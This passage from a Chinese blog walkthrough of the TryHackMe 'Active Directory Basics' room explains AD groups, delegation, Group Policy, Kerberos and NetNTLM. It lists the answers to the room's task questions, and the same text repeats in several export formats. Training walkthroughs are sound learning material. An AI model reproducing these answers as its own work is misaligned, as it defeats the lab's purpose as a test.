1.**集中管理用户和计算机**：Active Directory可以集中管理网络中的用户账户和计算机。管理员可以通过它创建、修改、删除用户账户和计算机账户，统一管理用户的登录权限和计算机的访问权限。\n<br>  \n- 2.**组织单位管理**：可以创建组织单位（OU），将用户和计算机按部门、地理位置等进行分类管理，方便对不同组织单位应用不同的策略和管理操作。\n<br>\n- 3.**组策略应用**：通过Active Directory可以将组策略应用到用户和计算机上。组策略可以控制用户的桌面环境、软件安装、安全设置等，实现对网络环境的统一配置和管理。\n<br>\n- 4.**资源访问控制**：可以设置用户对网络资源（如文件服务器、打印机等）的访问权限，确保只有授权用户可以访问特定资源。\n<br>\n- 5.**身份验证和授权**：Active Directory提供身份验证和授权机制，确保用户在登录网络时的身份合法性，并根据用户的权限进行授权操作。\n\n\n科普完之后咱开始看题\n## task2\n\n![task2](/images/Active-Directory-Basics教程/task2.png)\n\n这一题就是科普题\n\n1.在Windows域中，凭据被存储在一个的集中式存储库 存储库叫什么名字？\n\nActive Directory\n\n2.负责运行Active Directory服务的服务器被称为？\n\nDomain Controller\n\n\n## task3\n\n先看看怎么打开ad吧 在电脑中找了一波 就是没发现ad在哪。在问过大模型之后 发现AD是运行在Windows Server上的服务。我们电脑应该应该没 真的要这个功能需要下载 搞很多东西 这里就不搞了\n\n这个是ad的默认组\n- **域管理员(Domain Admins)**\t该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。\n- **务器操作员(Server Operators)**\t此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。\n- **份操作员(Backup Operators)**\t此组中的用户可以访问任何文件，而不受其权限的限制。它们用于执行计算机上的数据备份。\n- **账户操作员(Account Operators)**\t该组中的用户可以创建或修改域中的其他帐户。\n- **域用户(Domain Users)**\t包括域中所有现有的用户帐户。\n- **域计算机(Domain Computers)**\t包括域中所有现有的计算机。\n- **域控制器(Domain Controllers)**\t包括域中所有现有的 DC。\n\n识别机器帐户相对容易。它们遵循特定的命名方案。机器帐户名称是计算机的名称后跟美元符号。例如，名为的机器DC01将有一个名为的机器帐户**DC01$**。\n\n![task](/images/Active-Directory-Basics教程/task3.png)\n\n我们接着看看task3的题目 依旧科普题\n\n1.**Domain Admins** 该组的用户拥有整个域的管理权限 一般可以直接管理所有计算机\n\n2.**\"tom-pc$\"**  命名这些机器账户就是在名字后面加个美元符号\n\n第三题就是 organizational units\n\n## task4\n![task4](/images/Active-Directory-Basics教程/task4.png)\n\n我们来看第一问 我们现在windows的搜索框搜一下这个\n\n![task4](/images/Active-Directory-Basics教程/group.png)\n\n进去之后 我们随便点一下文件 出现以下的框框 点击第一个\n\n![task4](/images/Active-Directory-Basics教程/ad1.png)\n\n我们点击add 添加philip这个用户(题目提供了这个账户给我们) 给他给别的用户重设密码的权限\n\n![task4](/images/Active-Directory-Basics教程/ad2.png)\n\n![task4](/images/Active-Directory-Basics教程/ad3.png)\n\n改完之后我们远程登录phillip ip就是tryhackme提供的ip\n\n![task4](/images/Active-Directory-Basics教程/rd.png)\n\n![task4](/images/Active-Directory-Basics教程/login.png)\n\n登录之后我们用powershell来重设shphile的账户 **记住密码要符合一定的复杂程度！**\n\n```\nSet-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose\n```\n\n\n```\nSet-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose\n```\n\n![task4](/images/Active-Directory-Basics教程/setpasswd.png)\n\n一切就绪 我们开始远程登录\n\n![login](/images/Active-Directory-Basics教程/sophlogin.png)\n\n进入桌面就能看到flag\n\n![login](/images/Active-Directory-Basics教程/flag.png)\n\n第二问 向用户授予某些 OU 或其他 AD 对象的权限的过程称为\n**delegation**\n\n## task5\n\n![task5](/images/Active-Directory-Basics教程/task5.png)\n\n第一问挺有意思的 \n\n只能说我一开始是没搞明白啥意思\n\n我们在Windows的搜索栏搜一下users\n\n![task5](/images/Active-Directory-Basics教程/group.png)\n\n点进去照着图这么设置 显示出所有的东西\n\n![task5](/images/Active-Directory-Basics教程/fix.png)\n\n找到computer这个组\n\n![task5](/images/Active-Directory-Basics教程/fix2.png)\n\n将这里的勾去掉\n\n![task5](/images/Active-Directory-Basics教程/fix3.png)\n\n然后点击thm.local 新建两个文件一个是servers另一个是workstations\n\n![task5](/images/Active-Directory-Basics教程/fixxx.png)\n\n恭喜~~你被我恭喜到了~~以上是让你熟悉熟悉操作的 打开computer那个组 把s开头的那几个减掉 就是第一题的答案\n\n第二题当然是yay\n\n## task6\nWindows 通过**组策略对象** ( GPO )管理此类策略。GPO 只是可应用于 **OU**的设置集合。GPO 可以包含针对用户或计算机的策略，\n\nGPO 通过名为 的网络共享分发到网络**SYSVOL**，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向C:\\Windows\\SYSVOL\\sysvol\\我们网络中每个 DC 上的目录。\n\n```\ngpupdate /force\n``` \n\n我们看一下题目\n\n![](/images/Active-Directory-Basics教程/task6.png)\n\n第一题是通过sysvol将gpo分发到域机器\n\n第二题 gpo可以将设置应用在用户和计算机\n\n## task7\n\n身份验证方法\n\nWindows 域中的网络身份验证可以使用两种协议：\n**Kerberos**：任何较新版本的 Windows 均使用此协议。这是任何较新域中的默认协议。\n\n**NetNTLM**：为了兼容性目的而保留的旧式身份验证协议。\n\n### Kerberos身份验证\n\nKerberos身份验证是 Windows 最新版本的默认身份验证协议。使用Kerberos登录服务的用户将被分配票证。将票证视为先前身份验证的证明。拥有票证的用户可以将其出示给服务，以证明他们之前已通过网络身份验证，因此可以使用该服务。\n\n当使用Kerberos进行身份验证时，会发生以下过​​程：\n\n#### 第一步\n用户将其用户名和使用从其密码派生的密钥加密的**时间戳**发送到**密钥分发中心 (KDC)**，kdc负责在网络上创建**Kerberos票证**。\n\n**KDC**将创建并返回一个票证授予**票证 ( TGT )**，这将允许用户请求更多票证以访问特定服务。需要票证才能获得更多票证听起来可能有点奇怪，但它允许用户在每次想要连接到服务时请求服务票证而无需传递其凭据。除了 TGT 之外，还会向用户提供会话密钥，他们将需要该密钥来生成以下请求。\n\n\n#### 第二步\n\n当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其TGT向 KDC 请求**票证授予服务 (TGS)**。TGS 是仅允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用会话密钥加密的用户名和时间戳，以及 TGT和服务主体名称 (SPN)，后者指示我们打算访问的服务和服务器名称。\n\n因此，KDC 将向我们发送 TGS 以及服务会话密钥，我们需要该密钥来验证我们要访问的服务。TGS 使用从 服务所有者哈希派生的密钥进行加密。服务所有者是服务在其下运行的用户或机器帐户。TGS 在其加密内容中包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。\n\n\n#### 第三步\n然后，TGS 可以发送到所需的服务以进行身份​​验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。\n\n\n### NetNTLM 身份验证\n\nNetNTLM 采用质询-响应机制。 整个过程如下：\n\n1.客户端向其想要访问的服务器发送身份验证请求。\n2.服务器生成一个随机数并将其作为挑战发送给客户端。\n3.客户端将其NTLM密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应并将其发送回服务器进行验证。\n4.服务器将质询和响应转发给域控制器进行验证。\n5.域控制器使用该质询重新计算响应，并将其与客户端发送的原始响应进行比较。 如果两者匹配，则客户端通过身份验证； 否则，访问被拒绝。 身份验证结果将发送回服务器。\n6.服务器将认证结果转发给客户端。\n\n请注意，出于安全考虑，用户的密码（或哈希值）绝不会通过网络传输。\n\n---\n任务七的题目在这\n\n![task7](/images/Active-Directory-Basics教程/task7.png)\n\n第一题 Windows是默认使用**Kerberos** 所以填nay\n\n第二题 当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其**TGT**向 KDC 请求票证授予服务 (TGS) tgt就是答案\n\n第三题 密码不会通过网络传输 填nay\n\n## task8\n\ntrees forests and trusts\n### trees\n\nActive Directory 支持集成多个域，这样就可以将网络划分为可以独立管理的单元。如果您有两个共享**相同命名空间**的域，则可以将这些域合并为一个**tree(树)**。\n\n![tree](/images/Active-Directory-Basics教程/tree.png)\n\n### forests\n\n将具有**不同命名空间**的多个树合并到**同一个网络**中称为**forest森林**。\n\n![forest](/images/Active-Directory-Basics教程/forest.png)\n\n### trusts\n\n以树和森林形式组织的多个域可让您在管理和资源方面拥有良好的分区网络。但在某个时候，alice的用户可能需要访问bob 服务器之一中的共享文件。为此，以树和森林形式组织的域通过信任关系连接在一起。\n\n还可以建立双向信任关系，以允许两个域相互授权对方的用户。默认情况下，将多个域加入一棵树或一个森林下将形成双向信任关系。\n\n![task8](/images/Active-Directory-Basics教程/8.png)\n\n第一题就是tree\n第二题是a trust relationship   \n\n也算是做完这个了 就是熟悉活动目录 以及对用户和组的一些管理 了解了解一些功能。太太太粪怪了 没多大意思","slug":"Active-Directory-Basics教程","published":1,"updated":"2025-01-20T10:39:30.740Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvx90003tsg6dop16epm","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>Active Directory Basics教程<br>这个只能说没遇到过 在未来工作管理中还蛮适合的 就是可以管理用户和计算机的好工具 </p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/title.png\" alt=\"ad\"></p>\n<p><strong>Active Directory</strong>（活动目录）是微软Windows操作系统中用于存储网络资源信息和管理网络用户权限的一种目录服务。它在企业级网络环境中广泛使用，主要用于集中管理用户账户、计算机、组织单位、组策略等网络资源。</p>\n<p>Windows 计算机网络的通用组件的管理集中在一个名为<strong>Active Directory  ( AD )</strong> 的存储库中。运行 Active Directory 服务的服务器称为<strong>Domain Controller 域控制器 ( DC )。</strong></p>\n<h2 id=\"Active-Directory作用\"><a href=\"#Active-Directory作用\" class=\"headerlink\" title=\"Active Directory作用\"></a>Active Directory作用</h2><ul>\n<li>1.<strong>集中管理用户和计算机</strong>：Active Directory可以集中管理网络中的用户账户和计算机。管理员可以通过它创建、修改、删除用户账户和计算机账户，统一管理用户的登录权限和计算机的访问权限。<br>  </li>\n<li>2.<strong>组织单位管理</strong>：可以创建组织单位（OU），将用户和计算机按部门、地理位置等进行分类管理，方便对不同组织单位应用不同的策略和管理操作。<br></li>\n<li>3.<strong>组策略应用</strong>：通过Active Directory可以将组策略应用到用户和计算机上。组策略可以控制用户的桌面环境、软件安装、安全设置等，实现对网络环境的统一配置和管理。<br></li>\n<li>4.<strong>资源访问控制</strong>：可以设置用户对网络资源（如文件服务器、打印机等）的访问权限，确保只有授权用户可以访问特定资源。<br></li>\n<li>5.<strong>身份验证和授权</strong>：Active Directory提供身份验证和授权机制，确保用户在登录网络时的身份合法性，并根据用户的权限进行授权操作。</li>\n</ul>\n<p>科普完之后咱开始看题</p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task2.png\" alt=\"task2\"></p>\n<p>这一题就是科普题</p>\n<p>1.在Windows域中，凭据被存储在一个的集中式存储库 存储库叫什么名字？</p>\n<p>Active Directory</p>\n<p>2.负责运行Active Directory服务的服务器被称为？</p>\n<p>Domain Controller</p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>先看看怎么打开ad吧 在电脑中找了一波 就是没发现ad在哪。在问过大模型之后 发现AD是运行在Windows Server上的服务。我们电脑应该应该没 真的要这个功能需要下载 搞很多东西 这里就不搞了</p>\n<p>这个是ad的默认组</p>\n<ul>\n<li><strong>域管理员(Domain Admins)</strong>\t该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。</li>\n<li><strong>务器操作员(Server Operators)</strong>\t此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。</li>\n<li><strong>份操作员(Backup Operators)</strong>\t此组中的用户可以访问任何文件，而不受其权限的限制。它们用于执行计算机上的数据备份。</li>\n<li><strong>账户操作员(Account Operators)</strong>\t该组中的用户可以创建或修改域中的其他帐户。</li>\n<li><strong>域用户(Domain Users)</strong>\t包括域中所有现有的用户帐户。</li>\n<li><strong>域计算机(Domain Computers)</strong>\t包括域中所有现有的计算机。</li>\n<li><strong>域控制器(Domain Controllers)</strong>\t包括域中所有现有的 DC。</li>\n</ul>\n<p>识别机器帐户相对容易。它们遵循特定的命名方案。机器帐户名称是计算机的名称后跟美元符号。例如，名为的机器DC01将有一个名为的机器帐户**DC01$**。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task3.png\" alt=\"task\"></p>\n<p>我们接着看看task3的题目 依旧科普题</p>\n<p>1.<strong>Domain Admins</strong> 该组的用户拥有整个域的管理权限 一般可以直接管理所有计算机</p>\n<p>2.<strong>“tom-pc$”</strong>  命名这些机器账户就是在名字后面加个美元符号</p>\n<p>第三题就是 organizational units</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<p>我们来看第一问 我们现在windows的搜索框搜一下这个</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/group.png\" alt=\"task4\"></p>\n<p>进去之后 我们随便点一下文件 出现以下的框框 点击第一个</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/ad1.png\" alt=\"task4\"></p>\n<p>我们点击add 添加philip这个用户(题目提供了这个账户给我们) 给他给别的用户重设密码的权限</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/ad2.png\" alt=\"task4\"></p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/ad3.png\" alt=\"task4\"></p>\n<p>改完之后我们远程登录phillip ip就是tryhackme提供的ip</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/rd.png\" alt=\"task4\"></p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/login.png\" alt=\"task4\"></p>\n<p>登录之后我们用powershell来重设shphile的账户 <strong>记住密码要符合一定的复杂程度！</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt &#x27;New Password&#x27;) -Verbose</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/setpasswd.png\" alt=\"task4\"></p>\n<p>一切就绪 我们开始远程登录</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/sophlogin.png\" alt=\"login\"></p>\n<p>进入桌面就能看到flag</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/flag.png\" alt=\"login\"></p>\n<p>第二问 向用户授予某些 OU 或其他 AD 对象的权限的过程称为<br><strong>delegation</strong></p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task5.png\" alt=\"task5\"></p>\n<p>第一问挺有意思的 </p>\n<p>只能说我一开始是没搞明白啥意思</p>\n<p>我们在Windows的搜索栏搜一下users</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/group.png\" alt=\"task5\"></p>\n<p>点进去照着图这么设置 显示出所有的东西</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fix.png\" alt=\"task5\"></p>\n<p>找到computer这个组</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fix2.png\" alt=\"task5\"></p>\n<p>将这里的勾去掉</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fix3.png\" alt=\"task5\"></p>\n<p>然后点击thm.local 新建两个文件一个是servers另一个是workstations</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fixxx.png\" alt=\"task5\"></p>\n<p>恭喜<del>你被我恭喜到了</del>以上是让你熟悉熟悉操作的 打开computer那个组 把s开头的那几个减掉 就是第一题的答案</p>\n<p>第二题当然是yay</p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>Windows 通过<strong>组策略对象</strong> ( GPO )管理此类策略。GPO 只是可应用于 <strong>OU</strong>的设置集合。GPO 可以包含针对用户或计算机的策略，</p>\n<p>GPO 通过名为 的网络共享分发到网络<strong>SYSVOL</strong>，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向C:\\Windows\\SYSVOL\\sysvol\\我们网络中每个 DC 上的目录。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpupdate /force</span><br></pre></td></tr></table></figure>\n\n<p>我们看一下题目</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task6.png\"></p>\n<p>第一题是通过sysvol将gpo分发到域机器</p>\n<p>第二题 gpo可以将设置应用在用户和计算机</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>身份验证方法</p>\n<p>Windows 域中的网络身份验证可以使用两种协议：<br><strong>Kerberos</strong>：任何较新版本的 Windows 均使用此协议。这是任何较新域中的默认协议。</p>\n<p><strong>NetNTLM</strong>：为了兼容性目的而保留的旧式身份验证协议。</p>\n<h3 id=\"Kerberos身份验证\"><a href=\"#Kerberos身份验证\" class=\"headerlink\" title=\"Kerberos身份验证\"></a>Kerberos身份验证</h3><p>Kerberos身份验证是 Windows 最新版本的默认身份验证协议。使用Kerberos登录服务的用户将被分配票证。将票证视为先前身份验证的证明。拥有票证的用户可以将其出示给服务，以证明他们之前已通过网络身份验证，因此可以使用该服务。</p>\n<p>当使用Kerberos进行身份验证时，会发生以下过​​程：</p>\n<h4 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h4><p>用户将其用户名和使用从其密码派生的密钥加密的<strong>时间戳</strong>发送到<strong>密钥分发中心 (KDC)<strong>，kdc负责在网络上创建</strong>Kerberos票证</strong>。</p>\n<p><strong>KDC</strong>将创建并返回一个票证授予**票证 ( TGT )**，这将允许用户请求更多票证以访问特定服务。需要票证才能获得更多票证听起来可能有点奇怪，但它允许用户在每次想要连接到服务时请求服务票证而无需传递其凭据。除了 TGT 之外，还会向用户提供会话密钥，他们将需要该密钥来生成以下请求。</p>\n<h4 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h4><p>当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其TGT向 KDC 请求**票证授予服务 (TGS)**。TGS 是仅允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用会话密钥加密的用户名和时间戳，以及 TGT和服务主体名称 (SPN)，后者指示我们打算访问的服务和服务器名称。</p>\n<p>因此，KDC 将向我们发送 TGS 以及服务会话密钥，我们需要该密钥来验证我们要访问的服务。TGS 使用从 服务所有者哈希派生的密钥进行加密。服务所有者是服务在其下运行的用户或机器帐户。TGS 在其加密内容中包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p>\n<h4 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h4><p>然后，TGS 可以发送到所需的服务以进行身份​​验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</p>\n<h3 id=\"NetNTLM-身份验证\"><a href=\"#NetNTLM-身份验证\" class=\"headerlink\" title=\"NetNTLM 身份验证\"></a>NetNTLM 身份验证</h3><p>NetNTLM 采用质询-响应机制。 整个过程如下：</p>\n<p>1.客户端向其想要访问的服务器发送身份验证请求。<br>2.服务器生成一个随机数并将其作为挑战发送给客户端。<br>3.客户端将其NTLM密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应并将其发送回服务器进行验证。<br>4.服务器将质询和响应转发给域控制器进行验证。<br>5.域控制器使用该质询重新计算响应，并将其与客户端发送的原始响应进行比较。 如果两者匹配，则客户端通过身份验证； 否则，访问被拒绝。 身份验证结果将发送回服务器。<br>6.服务器将认证结果转发给客户端。</p>\n<p>请注意，出于安全考虑，用户的密码（或哈希值）绝不会通过网络传输。</p>\n<hr>\n<p>任务七的题目在这</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task7.png\" alt=\"task7\"></p>\n<p>第一题 Windows是默认使用<strong>Kerberos</strong> 所以填nay</p>\n<p>第二题 当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其<strong>TGT</strong>向 KDC 请求票证授予服务 (TGS) tgt就是答案</p>\n<p>第三题 密码不会通过网络传输 填nay</p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>trees forests and trusts</p>\n<h3 id=\"trees\"><a href=\"#trees\" class=\"headerlink\" title=\"trees\"></a>trees</h3><p>Active Directory 支持集成多个域，这样就可以将网络划分为可以独立管理的单元。如果您有两个共享<strong>相同命名空间</strong>的域，则可以将这些域合并为一个**tree(树)**。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/tree.png\" alt=\"tree\"></p>\n<h3 id=\"forests\"><a href=\"#forests\" class=\"headerlink\" title=\"forests\"></a>forests</h3><p>将具有<strong>不同命名空间</strong>的多个树合并到<strong>同一个网络</strong>中称为<strong>forest森林</strong>。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/forest.png\" alt=\"forest\"></p>\n<h3 id=\"trusts\"><a href=\"#trusts\" class=\"headerlink\" title=\"trusts\"></a>trusts</h3><p>以树和森林形式组织的多个域可让您在管理和资源方面拥有良好的分区网络。但在某个时候，alice的用户可能需要访问bob 服务器之一中的共享文件。为此，以树和森林形式组织的域通过信任关系连接在一起。</p>\n<p>还可以建立双向信任关系，以允许两个域相互授权对方的用户。默认情况下，将多个域加入一棵树或一个森林下将形成双向信任关系。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/8.png\" alt=\"task8\"></p>\n<p>第一题就是tree<br>第二题是a trust relationship   </p>\n<p>也算是做完这个了 就是熟悉活动目录 以及对用户和组的一些管理 了解了解一些功能。太太太粪怪了 没多大意思</p>\n","excerpt":"","more":"<p>Active Directory Basics教程<br>这个只能说没遇到过 在未来工作管理中还蛮适合的 就是可以管理用户和计算机的好工具 </p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/title.png\" alt=\"ad\"></p>\n<p><strong>Active Directory</strong>（活动目录）是微软Windows操作系统中用于存储网络资源信息和管理网络用户权限的一种目录服务。它在企业级网络环境中广泛使用，主要用于集中管理用户账户、计算机、组织单位、组策略等网络资源。</p>\n<p>Windows 计算机网络的通用组件的管理集中在一个名为<strong>Active Directory  ( AD )</strong> 的存储库中。运行 Active Directory 服务的服务器称为<strong>Domain Controller 域控制器 ( DC )。</strong></p>\n<h2 id=\"Active-Directory作用\"><a href=\"#Active-Directory作用\" class=\"headerlink\" title=\"Active Directory作用\"></a>Active Directory作用</h2><ul>\n<li>1.<strong>集中管理用户和计算机</strong>：Active Directory可以集中管理网络中的用户账户和计算机。管理员可以通过它创建、修改、删除用户账户和计算机账户，统一管理用户的登录权限和计算机的访问权限。<br>  </li>\n<li>2.<strong>组织单位管理</strong>：可以创建组织单位（OU），将用户和计算机按部门、地理位置等进行分类管理，方便对不同组织单位应用不同的策略和管理操作。<br></li>\n<li>3.<strong>组策略应用</strong>：通过Active Directory可以将组策略应用到用户和计算机上。组策略可以控制用户的桌面环境、软件安装、安全设置等，实现对网络环境的统一配置和管理。<br></li>\n<li>4.<strong>资源访问控制</strong>：可以设置用户对网络资源（如文件服务器、打印机等）的访问权限，确保只有授权用户可以访问特定资源。<br></li>\n<li>5.<strong>身份验证和授权</strong>：Active Directory提供身份验证和授权机制，确保用户在登录网络时的身份合法性，并根据用户的权限进行授权操作。</li>\n</ul>\n<p>科普完之后咱开始看题</p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task2.png\" alt=\"task2\"></p>\n<p>这一题就是科普题</p>\n<p>1.在Windows域中，凭据被存储在一个的集中式存储库 存储库叫什么名字？</p>\n<p>Active Directory</p>\n<p>2.负责运行Active Directory服务的服务器被称为？</p>\n<p>Domain Controller</p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>先看看怎么打开ad吧 在电脑中找了一波 就是没发现ad在哪。在问过大模型之后 发现AD是运行在Windows Server上的服务。我们电脑应该应该没 真的要这个功能需要下载 搞很多东西 这里就不搞了</p>\n<p>这个是ad的默认组</p>\n<ul>\n<li><strong>域管理员(Domain Admins)</strong>\t该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。</li>\n<li><strong>务器操作员(Server Operators)</strong>\t此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。</li>\n<li><strong>份操作员(Backup Operators)</strong>\t此组中的用户可以访问任何文件，而不受其权限的限制。它们用于执行计算机上的数据备份。</li>\n<li><strong>账户操作员(Account Operators)</strong>\t该组中的用户可以创建或修改域中的其他帐户。</li>\n<li><strong>域用户(Domain Users)</strong>\t包括域中所有现有的用户帐户。</li>\n<li><strong>域计算机(Domain Computers)</strong>\t包括域中所有现有的计算机。</li>\n<li><strong>域控制器(Domain Controllers)</strong>\t包括域中所有现有的 DC。</li>\n</ul>\n<p>识别机器帐户相对容易。它们遵循特定的命名方案。机器帐户名称是计算机的名称后跟美元符号。例如，名为的机器DC01将有一个名为的机器帐户**DC01$**。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task3.png\" alt=\"task\"></p>\n<p>我们接着看看task3的题目 依旧科普题</p>\n<p>1.<strong>Domain Admins</strong> 该组的用户拥有整个域的管理权限 一般可以直接管理所有计算机</p>\n<p>2.<strong>“tom-pc$”</strong>  命名这些机器账户就是在名字后面加个美元符号</p>\n<p>第三题就是 organizational units</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<p>我们来看第一问 我们现在windows的搜索框搜一下这个</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/group.png\" alt=\"task4\"></p>\n<p>进去之后 我们随便点一下文件 出现以下的框框 点击第一个</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/ad1.png\" alt=\"task4\"></p>\n<p>我们点击add 添加philip这个用户(题目提供了这个账户给我们) 给他给别的用户重设密码的权限</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/ad2.png\" alt=\"task4\"></p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/ad3.png\" alt=\"task4\"></p>\n<p>改完之后我们远程登录phillip ip就是tryhackme提供的ip</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/rd.png\" alt=\"task4\"></p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/login.png\" alt=\"task4\"></p>\n<p>登录之后我们用powershell来重设shphile的账户 <strong>记住密码要符合一定的复杂程度！</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt &#x27;New Password&#x27;) -Verbose</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/setpasswd.png\" alt=\"task4\"></p>\n<p>一切就绪 我们开始远程登录</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/sophlogin.png\" alt=\"login\"></p>\n<p>进入桌面就能看到flag</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/flag.png\" alt=\"login\"></p>\n<p>第二问 向用户授予某些 OU 或其他 AD 对象的权限的过程称为<br><strong>delegation</strong></p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task5.png\" alt=\"task5\"></p>\n<p>第一问挺有意思的 